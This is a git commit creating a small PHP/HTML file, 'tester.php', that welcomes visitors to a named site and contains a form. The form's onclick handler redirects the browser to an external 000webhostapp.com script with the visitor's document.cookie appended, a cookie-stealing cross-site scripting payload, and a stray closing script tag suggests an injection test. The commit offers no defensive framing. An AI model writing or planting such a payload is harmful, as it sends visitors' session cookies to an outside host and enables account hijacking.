6934c4f311056693492a6604d0e5395402b69a8b
eshetie <fc.eshetie@gmail.com>
2019-01-31 23:07:43 -0800

    Create tester.php

---
+++ tester.php
@@ -0,0 +1,14 @@
+<?php
+echo "<h1>Welcome to peneshe.com</h1>";
+
+?>
+</script>
+<html>
+<body>
+<button onclick="">test on me</button>
+<form  onclick=document.location='https://four-part-beams.000webhostapp.com/st.php?coky='+document.cookie x="" method="post" enctype="multipart/form-data" name="form_comment" id="form_comment" target="forms_target">
+
+this is from form
+</form>
+</body>
+</html>
